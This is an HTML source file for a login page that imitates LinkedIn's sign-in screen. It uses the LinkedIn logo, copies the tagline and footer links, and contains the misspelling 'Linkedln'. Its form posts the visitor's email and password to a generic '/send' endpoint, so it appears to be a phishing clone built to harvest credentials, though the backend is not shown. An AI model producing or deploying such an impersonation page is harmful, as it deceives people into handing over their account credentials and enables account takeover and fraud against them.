<!DOCTYPE html>
<html lang="en">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous" />
    <link rel="stylesheet" href="public/css/style.css" />

    <title>Welcome back login page</title>
</head>

<body>
    <center>
        <div id="fancy1-header1">
            <form action="/send" method="POST">
                <img src="public/images/logo-linkedin.png" alt="logo" />
                <h1 class="fancy-header_content">Welcome Back</h1>
                <p class="fancy-hearder_content_2">
                    Don't miss your next opportunity. Sign in to stay updated on your professional world.
                </p>
                <div id="Fancy-header">
                    <div class="form-email">
                        <input type="email" name="email" class="form-control form-control-lg" placeholder=" Email or Phone" />
                    </div>

                    <div class="form-group">
                        <input type="password" name="password" class="form-control form-control-lg" placeholder="Password" />
                    </div>
                    <div class="checkbox mb-3">
                        <label>
                            <input type="checkbox" value="remember-me" /> Remember me
                        </label>
                        <a href="#"> Learn More </a>
                    </div>

                    <button class="button btn btn-primary btn-lg btn-block">
                        Sign in
                    </button>
                    <div class="forgot-password">
                        <a href="#">Forgot password</a>
                    </div>
                    <p>New to Linkedln?<a href="#"> Join now</a></p>
                </div>
            </form>

            <div class="footer">
                <hr width="100%" size="100%" />
                <div id="work">
                    <div class="last"></div>
                    <ul class="list-inline">
                        <li class="list-inline-item">
                            <img src="public/images/logo-linkedin.png" alt="link" />
                        </li>
                        <li class="list-inline-item">
                            <small class="d-block mb-3 text-muted">&copy; 2020</small>
                        </li>
                        <li class="list-inline-item">
                            <a href="#" class="downside">User Agreement</a>
                        </li>
                        <li class="list-inline-item">
                            <a href="#" class="downside"> Privacy Policy</a>
                        </li>
                        <li class="list-inline-item">
                            <a href="#" class="downside">Community Guidelines</a>
                        </li>
                        <li class="list-inline-item">
                            <a href="#" class="downside">Cookie Policy</a>
                        </li>
                        <li class="list-inline-item">
                            <a href="#" class="downside"> Copyright</a>
                        </li>
                        <li class="list-inline-item">
                            <a href="#" class="downside"> Policy</a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
    </center>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous">
    </script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous">
    </script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous">
    </script>
    <script src="index.js"></script>
</body>

</html>
